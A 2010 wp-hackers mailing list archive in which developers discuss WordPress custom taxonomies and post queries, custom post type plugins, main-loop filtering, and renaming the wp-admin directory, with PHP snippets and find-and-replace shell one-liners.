>   1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>   2. Querying posts of another WordPress install (Ashish Saini)
>   3. Re: Querying posts of another WordPress install (Ashish Saini)
>   4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Mon, 26 Jul 2010 06:06:14 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Custom post types - a multitude of problems
> To: wp-hackers at lists.automattic.com
> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
> > I need to output the contents (all posts, all content of those posts) of
> > a specific custom category (taxonomy) and I have no idea how to get it
> > done. All I want is a page that outputs all the posts for a certain
> > category (and that category only) that I created using this code:
> >
> > register_taxonomy("clients", array("portfolio_item"),
> > array("hierarchical" => true, "label" => "Clients", "singular_label" =>
> > "Client", "rewrite" => array('slug'=>'portfolio_item')));
> >
> > Yes, that part was simple, but for some reason my custom taxonomy is
> > completely separate from the rest of the site and irretrievable. Can't
> > figure out for the life of me how to do this.
>
> To start, I think you have your taxonomy registration wrong. (FWIW my
> preference would be to go with a singular for the taxonomy name, e.g.
> "client" but I'll leave yours as is):
>
>  $labels = array(
>    'name' => _x( 'Clients', 'taxonomy general name' ),
>    'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>    'search_items' =>  __( 'Search Clients' ),
>    'all_items' => __( 'All Clients' ),
>    'parent_item' => __( 'Parent Client' ),
>    'parent_item_colon' => __( 'Parent Client:' ),
>    'edit_item' => __( 'Edit Client' ),
>    'update_item' => __( 'Update Client' ),
>    'add_new_item' => __( 'Add New Client' ),
>    'new_item_name' => __( 'New Client Name' ),
>  );
>
> register_taxonomy("clients", array("portfolio_item"),array(
>        "hierarchical" => true,
>        "labels" => $labels,
>        "public" => true,
>        "show_ui" => true,
>        "query_var" => "clients",
>        "rewrite" => array('slug'=>'client'),
> ));
>
> Many of these options will default but I went ahead and listed them all.
>  Read more here:
>
> http://codex.wordpress.org/Function_Reference/register_taxonomy
>
> As for the rest of your question, I'm unclear.  Do you want all Portfolio
> Items that have *any* clients, or a specific client?  For a specific client
> i.e. "john-smith" I think this would be what you need (though I haven't run
> the code so it may have typos):
>
> <?php
> $portfolio_items = new
> WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&posts_per_page=-1');
> if ( $portfolio_items->have_posts() ):
>        while ( $portfolio_items->have_posts() ) :
> $portfolio_items->the_post(); ?>
>                <h2 id="post-<?php the_ID(); ?>" <?php post_class();
> ?>><?php the_title(); ?></h2>
>                <?php the_content();
>        endwhile;
> endif;
>
> If you want to get all portfolio items that have *any* clients I've
> actually not done that before so I'll have to let someone else answer.
>
> HTH.
>
> -Mike
>
> ------------------------------
>
> Message: 2
> Date: Mon, 26 Jul 2010 17:08:30 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers <wp-hackers at lists.automattic.com>
> Message-ID:
>        <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Hi,
>
> Is there any way that I can query posts from another WordPress install
> residing in the same database? I know it can be done via SQL queries but is
> there any workaround hacking my way along with API?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> ------------------------------
>
> Message: 3
> Date: Mon, 26 Jul 2010 17:12:22 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: Re: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers <wp-hackers at lists.automattic.com>
> Message-ID:
>        <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> I think this can be done with the help of setup_postdata() by populating
> the
> fields as explained here -
> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>
> Right? And is this the best approach?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Hi,
> >
> > Is there any way that I can query posts from another WordPress install
> > residing in the same database? I know it can be done via SQL queries but
> is
> > there any workaround hacking my way along with API?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter : http://twitter.com/ashfame
> >
>
>
> ------------------------------
>
> Message: 4
> Date: Mon, 26 Jul 2010 07:56:17 -0400
> From: Aaron Jorbin <aaron at jorb.in>
> Subject: Re: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Is this using Multisite?  If so, you can use switch_to_blog -
> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
> counterpart restore_current_blog -
> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
> around use the api.
>
>
>
> http://aaron.jorb.in
> twitter: twitter.com/aaronjorbin
>
>
> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > I think this can be done with the help of setup_postdata() by populating
> > the
> > fields as explained here -
> > http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
> >
> > Right? And is this the best approach?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter
> > : http://twitter.com/ashfame
> >
> >
> > On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
> > <ashishsainiashfame at gmail.com>wrote:
> >
> > > Hi,
> > >
> > > Is there any way that I can query posts from another WordPress install
> > > residing in the same database? I know it can be done via SQL queries
> but
> > is
> > > there any workaround hacking my way along with API?
> > >
> > > Thanks & Regards
> > > Ashish Saini aka Ashfame
> > > (Deserve Before You Desire)
> > > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > > Twitter : http://twitter.com/ashfame
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 66, Issue 101
> *******************************************
>



-- 
Thank you,

Jared Williams
Web/Graphic Designer
Tweeaks.com  |  New2WP.com

From bradw at illiams.com  Mon Jul 26 13:24:30 2010
From: bradw at illiams.com (Brad Williams)
Date: Mon, 26 Jul 2010 09:24:30 -0400
Subject: [wp-hackers] Is there any compelling reason to use a
	custom	post type plugin?
In-Reply-To: <DE6D0164-BB99-4158-8884-EBF15B67548A@newclarity.net>
References: <AANLkTimCYpv6po7bh0TNGq5aXYR6C5e6fkjVp=ud11sY@mail.gmail.com>
	<DE6D0164-BB99-4158-8884-EBF15B67548A@newclarity.net>
Message-ID: <00b801cb2cc5$e123f280$a36bd780$@com>

As a developer of one of these plugins (Custom Post Type UI) I would also
agree that for advanced users/setups you should manually register your post
types and taxonomies.  My plugin will never be the end-all solution to
custom post types.  I developed the plugin to help beginners get comfortable
with post types and how they work.

-Brad
@williamsba

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike Schinkel
Sent: Saturday, July 24, 2010 12:30 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Is there any compelling reason to use a custom
post type plugin?

On Jul 23, 2010, at 10:13 PM, Angelia Baladon wrote:
> Does anyone have any compelling argument for why it would be better to
> use a plugin for managing post types and taxonomies, if you are
> capable of doing all of the registrations yourself in your functions
> file?

I've evolved my thinking over the past few month after using custom post
types heavily for several projects.  Here goes:

=========
Pros of Using Admin-console Plugins for Managing Custom Post Types
=========
-- Great for End Users who want to do some basic things and that will never
be able to willing to write code.
-- Great for rapid prototyping, especially face-to-face with a client.
-- Great for themers and developers new to custom post types to get familiar
with the options and what effect each option has.

=========
Pros of Registering Custom Post Types in Code
=========
-- Much easier to deploy .PHP files via FTP than to merge configuration
stored in a MySQL database 
-- Much easier to apply the best practice of source code control with
Subversion or Git
-- Easier for those who are more advanced (text copy/paste then editing is
easier than editing in the admin or trying to export/import MySQL data.)
-- Possible to associate related functionality within a single deployable
unit (i.e. plugin, or theme.)
-- Results in more robust applications (end user admins can't break your app
by changing critical functionality.)
 
In summary, admins console plugins are for learning and prototyping and for
advanced users whereas registering via code are for those who are building
plugins, themes and robust web sites. IMO at least.

Hope this helps.

-Mike
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From KrisY at tbs.uk.com  Mon Jul 26 14:53:01 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 26 Jul 2010 15:53:01 +0100
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
	<AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>

I was as nice as I could be in my original mail without getting
frustrated - it really helps though that someone else is having the same
problem though. I honestly think this whole process was a lot more
complicated than it should have been.

Thanks for your solution - I will do my best to take a look at it today,
and will let you know when I make some progress. Thanks again, and also
to Mike Schinkel for the same.

Kris

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
Williams
Sent: 26 July 2010 14:23
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101

I have a wp_nav_menu, and it has two top level pages that have a bunch
of
terms I've created for two custom taxonomies, which are for the two top
level pages. I'm trying to figure out how I can hide the terms from the
drop
down menu I made that shows the terms, if there are no posts assigned to
a
term of the taxonomies. Is this possible? It doesn't seem like it is.


As for Kris Young's question about showing all posts of a taxonomy, this
is
a problem I ran into as well, and searched for a long time and found it
very
hard to figure out.

What I managed to do is list all terms for a taxonomy, and all the posts
for
each term individually. You may be able to hack this to do what you're
trying to do since it is the same as what I needed to do I just didn't
have
time to make it list only the posts for the taxonomy.


<?php
// Create list of taxonomy terms and list the posts under each term
$post_type = 'post';
$tax = 'your_custom_taxonomy';
$tax_terms = get_terms( $tax );
if ($tax_terms) {
    foreach ($tax_terms  as $tax_term) {
    $args = array(
        'post_type' => $post_type,
        "tax" => $tax_term->slug,
        'post_status' => 'publish',
        'posts_per_page' => -1,
        'caller_get_posts'=> 1
    );

        $my_query = null;
        $my_query = new WP_Query($args);

        if( $my_query->have_posts() ) : ?>

            <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
<?php
echo $tax_term->name; ?></h2>
            <ul class="taxlist">
            <?php while ( $my_query->have_posts() ) :
$my_query->the_post();
?>

                <li id="post-<?php the_ID(); ?>">
                    <a href="<?php the_permalink(); ?>" rel="bookmark"
title="Permanent Link to <?php the_title_attribute(); ?>"><?php
the_title();
?></a>
                </li>


            <?php endwhile; // end of loop ?>
            </ul>

            <?php if( function_exists('wp_pagenavi')) { wp_pagenavi(); }
else { ?>
                <div class="navigation clearfix">
                    <div class="alignleft"><?php
next_posts_link('&laquo;
Previous Entries') ?></div>
                    <div class="alignright"><?php
previous_posts_link('Next
Entries &raquo;') ?></div>
                </div>
            <?php } ?>

        <?php else : ?>

            <h2 class="title">Oops</h2>
            <p>Looks like something is missing...</p>

        <?php endif; // if have_posts()
        wp_reset_query();

    } // end foreach #tax_terms
}
?>

Hope this helps.

Jared Williams


On Mon, Jul 26, 2010 at 8:00 AM,
<wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>   2. Querying posts of another WordPress install (Ashish Saini)
>   3. Re: Querying posts of another WordPress install (Ashish Saini)
>   4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Mon, 26 Jul 2010 06:06:14 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] Custom post types - a multitude of problems
> To: wp-hackers at lists.automattic.com
> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
> Content-Type: text/plain;       charset=us-ascii
>
> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
> > I need to output the contents (all posts, all content of those
posts) of
> > a specific custom category (taxonomy) and I have no idea how to get
it
> > done. All I want is a page that outputs all the posts for a certain
> > category (and that category only) that I created using this code:
> >
> > register_taxonomy("clients", array("portfolio_item"),
> > array("hierarchical" => true, "label" => "Clients", "singular_label"
=>
> > "Client", "rewrite" => array('slug'=>'portfolio_item')));
> >
> > Yes, that part was simple, but for some reason my custom taxonomy is
> > completely separate from the rest of the site and irretrievable.
Can't
> > figure out for the life of me how to do this.
>
> To start, I think you have your taxonomy registration wrong. (FWIW my
> preference would be to go with a singular for the taxonomy name, e.g.
> "client" but I'll leave yours as is):
>
>  $labels = array(
>    'name' => _x( 'Clients', 'taxonomy general name' ),
>    'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>    'search_items' =>  __( 'Search Clients' ),
>    'all_items' => __( 'All Clients' ),
>    'parent_item' => __( 'Parent Client' ),
>    'parent_item_colon' => __( 'Parent Client:' ),
>    'edit_item' => __( 'Edit Client' ),
>    'update_item' => __( 'Update Client' ),
>    'add_new_item' => __( 'Add New Client' ),
>    'new_item_name' => __( 'New Client Name' ),
>  );
>
> register_taxonomy("clients", array("portfolio_item"),array(
>        "hierarchical" => true,
>        "labels" => $labels,
>        "public" => true,
>        "show_ui" => true,
>        "query_var" => "clients",
>        "rewrite" => array('slug'=>'client'),
> ));
>
> Many of these options will default but I went ahead and listed them
all.
>  Read more here:
>
> http://codex.wordpress.org/Function_Reference/register_taxonomy
>
> As for the rest of your question, I'm unclear.  Do you want all
Portfolio
> Items that have *any* clients, or a specific client?  For a specific
client
> i.e. "john-smith" I think this would be what you need (though I
haven't run
> the code so it may have typos):
>
> <?php
> $portfolio_items = new
>
WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
s_per_page=-1');
> if ( $portfolio_items->have_posts() ):
>        while ( $portfolio_items->have_posts() ) :
> $portfolio_items->the_post(); ?>
>                <h2 id="post-<?php the_ID(); ?>" <?php post_class();
> ?>><?php the_title(); ?></h2>
>                <?php the_content();
>        endwhile;
> endif;
>
> If you want to get all portfolio items that have *any* clients I've
> actually not done that before so I'll have to let someone else answer.
>
> HTH.
>
> -Mike
>
> ------------------------------
>
> Message: 2
> Date: Mon, 26 Jul 2010 17:08:30 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers <wp-hackers at lists.automattic.com>
> Message-ID:
>        <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Hi,
>
> Is there any way that I can query posts from another WordPress install
> residing in the same database? I know it can be done via SQL queries
but is
> there any workaround hacking my way along with API?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> ------------------------------
>
> Message: 3
> Date: Mon, 26 Jul 2010 17:12:22 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: Re: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers <wp-hackers at lists.automattic.com>
> Message-ID:
>        <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> I think this can be done with the help of setup_postdata() by
populating
> the
> fields as explained here -
>
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>
> Right? And is this the best approach?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Hi,
> >
> > Is there any way that I can query posts from another WordPress
install
> > residing in the same database? I know it can be done via SQL queries
but
> is
> > there any workaround hacking my way along with API?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter : http://twitter.com/ashfame
> >
>
>
> ------------------------------
>
> Message: 4
> Date: Mon, 26 Jul 2010 07:56:17 -0400
> From: Aaron Jorbin <aaron at jorb.in>
> Subject: Re: [wp-hackers] Querying posts of another WordPress install
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Is this using Multisite?  If so, you can use switch_to_blog -
> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
> counterpart restore_current_blog -
> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
> around use the api.
>
>
>
> http://aaron.jorb.in
> twitter: twitter.com/aaronjorbin
>
>
> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > I think this can be done with the help of setup_postdata() by
populating
> > the
> > fields as explained here -
> >
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
> >
> > Right? And is this the best approach?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter
> > : http://twitter.com/ashfame
> >
> >
> > On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
> > <ashishsainiashfame at gmail.com>wrote:
> >
> > > Hi,
> > >
> > > Is there any way that I can query posts from another WordPress
install
> > > residing in the same database? I know it can be done via SQL
queries
> but
> > is
> > > there any workaround hacking my way along with API?
> > >
> > > Thanks & Regards
> > > Ashish Saini aka Ashfame
> > > (Deserve Before You Desire)
> > > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
|
> > > Twitter : http://twitter.com/ashfame
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 66, Issue 101
> *******************************************
>



-- 
Thank you,

Jared Williams
Web/Graphic Designer
Tweeaks.com  |  New2WP.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From johnbillion+wp at gmail.com  Mon Jul 26 15:13:30 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 26 Jul 2010 16:13:30 +0100
Subject: [wp-hackers] Applying a filter to the main loop only
Message-ID: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>

I suspect I'm missing something very simple here.

I'm writing a plugin which adds a filter to pre_get_posts but the
filter should only apply when we're dealing with the main WordPress
loop (ie. the one which is constructed using the query string). There
can potentially be several loops on any given page, and the main loop
may not be the first loop on the page (so I can't apply the filter and
then remove it at the end of the first loop).

How can I determine if the current loop is the "main" loop constructed
from the query string without having to touch the loop code in the
template?

Regards,
John

From wphax at nullamatix.com  Mon Jul 26 15:48:56 2010
From: wphax at nullamatix.com (Guy)
Date: Mon, 26 Jul 2010 11:48:56 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
Message-ID: <AANLkTin+v=6y92Zp84h2mmVgkiKQu76tR--tVRuhoS=P@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:14 AM, WP Customizer <wpcustomizer at gmail.com> wrote:
> So I decided I want to rename core files and folders to remove the wp-. ?I
> wrote a simple little program using vb .net that will recursivly edit every
> file in a given directory and do a find a replace operation to change name
> refrences. ?For example it finds refrences to wp-login.php and changes it to
> login.php.
>

You wrote a program for this? Why not:

bawx ~$ perl -pi -w -e 's/wp-admin/s3cr3t_wp_adm1n/g;' *.php

or...

bawx ~$ find ./wp-dev/* -type f -exec sed -i
's/wp-admin/s3cr3t_wp_adm1n/g' {} \;

Same would work for all "wp-*.*" files/folders.

???

And,

"If this is partly a security consideration, it would be much better
to lock down your wp-admin directory by IP, HTTP authentication, or
the like."

True, but what's even better is if /wp-admin/ doesn't even exist, in
addition to the IP & HTTP auth against the "new" wp-admin directory.

-Guy
www.nullamatix.com

From wphax at nullamatix.com  Mon Jul 26 15:48:56 2010
From: wphax at nullamatix.com (Guy)
Date: Mon, 26 Jul 2010 11:48:56 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
Message-ID: <AANLkTin+v=6y92Zp84h2mmVgkiKQu76tR--tVRuhoS=P@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:14 AM, WP Customizer <wpcustomizer at gmail.com> wrote:
> So I decided I want to rename core files and folders to remove the wp-. ?I
> wrote a simple little program using vb .net that will recursivly edit every
> file in a given directory and do a find a replace operation to change name
> refrences. ?For example it finds refrences to wp-login.php and changes it to
> login.php.
>

You wrote a program for this? Why not:

bawx ~$ perl -pi -w -e 's/wp-admin/s3cr3t_wp_adm1n/g;' *.php

or...

bawx ~$ find ./wp-dev/* -type f -exec sed -i
's/wp-admin/s3cr3t_wp_adm1n/g' {} \;

Same would work for all "wp-*.*" files/folders.

???

And,

"If this is partly a security consideration, it would be much better
to lock down your wp-admin directory by IP, HTTP authentication, or
the like."

True, but what's even better is if /wp-admin/ doesn't even exist, in
addition to the IP & HTTP auth against the "new" wp-admin directory.

-Guy
www.nullamatix.com

From otto at ottodestruct.com  Mon Jul 26 16:08:01 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 26 Jul 2010 11:08:01 -0500
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com> 
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com> 
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
Message-ID: <AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:03 AM, WP Customizer <wpcustomizer at gmail.com> wrote:
> It's mostly an annoyance at WP being everywhere in filenames, ect. ?Wht was
> wordpress ever written this way, IMO it should use generic names like admin,
> login,php, ect.

You are mistaken. Having prefixed is good because it avoids
conflicting names when trying to combine multiple packages together.
If it used a generic "admin" name then it would conflict with some
other program that used a generic "admin" name as well.

Prefixes, much like namespaces, prevent that sort of issue.

-Otto

From wpcustomizer at gmail.com  Mon Jul 26 16:15:28 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 09:15:28 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com>
Message-ID: <AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>

@ Otto: Thats a fairly unusuaul situation.  I image the majority of users
have wp alone in its own folder.  and for using wp in a commercial venture
brading is everything and having wp- splattered all over urls, detracts from
the company's branding.  At the least you should be able to change these by
changing path variables in wp-config.php.

But thats not the point,

@Guy: I'll admit i'm not sure what that even is, I'm guessing its shell
scripting.  If thats the case its easy then, cuz i'm on a simple shared
hosting no shell access.

On Mon, Jul 26, 2010 at 9:08 AM, Otto <otto at ottodestruct.com> wrote:

> On Mon, Jul 26, 2010 at 3:03 AM, WP Customizer <wpcustomizer at gmail.com>
> wrote:
> > It's mostly an annoyance at WP being everywhere in filenames, ect.  Wht
> was
> > wordpress ever written this way, IMO it should use generic names like
> admin,
> > login,php, ect.
>
> You are mistaken. Having prefixed is good because it avoids
> conflicting names when trying to combine multiple packages together.
> If it used a generic "admin" name then it would conflict with some
> other program that used a generic "admin" name as well.
>
> Prefixes, much like namespaces, prevent that sort of issue.
>
> -Otto
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Mon Jul 26 16:28:30 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 26 Jul 2010 12:28:30 -0400
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
Message-ID: <AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>

On Mon, Jul 26, 2010 at 11:13 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> I suspect I'm missing something very simple here.
>
> I'm writing a plugin which adds a filter to pre_get_posts but the
> filter should only apply when we're dealing with the main WordPress
> loop (ie. the one which is constructed using the query string). There
> can potentially be several loops on any given page, and the main loop
> may not be the first loop on the page (so I can't apply the filter and
> then remove it at the end of the first loop).
>
> How can I determine if the current loop is the "main" loop constructed
> from the query string without having to touch the loop code in the
> template?


Contrary to the advice of many a tutorial, the pre_get_posts hook is almost
always the wrong hook to use here. Please look at the parse_request and
request hooks, and also a wp-hackers thread from a few days ago titled
"pre_get_posts problem".

From otto at ottodestruct.com  Mon Jul 26 16:31:33 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 26 Jul 2010 11:31:33 -0500
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com> 
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com> 
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com> 
	<AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com> 
	<AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com>
Message-ID: <AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com>

On Mon, Jul 26, 2010 at 11:15 AM, WP Customizer <wpcustomizer at gmail.com> wrote:
> @ Otto: Thats a fairly unusuaul situation. ?I image the majority of users
> have wp alone in its own folder. ?and for using wp in a commercial venture
> brading is everything and having wp- splattered all over urls, detracts from
> the company's branding. ?At the least you should be able to change these by
> changing path variables in wp-config.php.

Why would wp be all over your URLs? I think you're doing it wrong.

The public facing URLs are controlled by your permalink settings. Only
the backend, which presumably is not accessible to the public, has wp
in the URLs.

And for reference, you can redefine the wp-content directory all you
like as setting in the config file. That's the only forward facing URL
your users might see.

-Otto

